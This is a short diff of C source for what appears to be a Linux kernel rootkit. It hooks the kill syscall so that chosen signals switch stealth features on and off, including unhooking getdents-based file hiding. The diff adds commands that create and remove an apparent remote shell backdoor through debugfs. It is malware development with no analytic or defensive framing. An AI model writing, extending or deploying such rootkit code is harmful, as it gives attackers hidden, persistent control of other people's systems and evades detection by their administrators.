@@ -1,5 +1,6 @@
 #include "cdd.h"
 #include "config.h"
+#include "debugfs.h"
 #include "evasion.h"
 #include "hook.h"
 #include "netfilter.h"
@@ -30,6 +31,10 @@ static notrace asmlinkage int _sys_kill_hook(int pid, int sig)
 			htm_cdd_destroy();
 			return 0;
 
+		case HTM_SIG_DISABLE_DEBUGFS:
+			htm_debugfs_rsh_remove();
+			return 0;
+
 		case HTM_SIG_DISABLE_FS:
 			htm_hook_uninstall(&hook_sys_getdents);
 			htm_hook_uninstall(&hook_sys_getdents64);
@@ -41,6 +46,10 @@ static notrace asmlinkage int _sys_kill_hook(int pid, int sig)
 
 		case HTM_SIG_ENABLE_CDD:
 			htm_cdd_create();
+			return 0;
+
+		case HTM_SIG_ENABLE_DEBUGFS:
+			htm_debugfs_rsh_create();
 			return 0;
 
 		case HTM_SIG_ENABLE_FS:
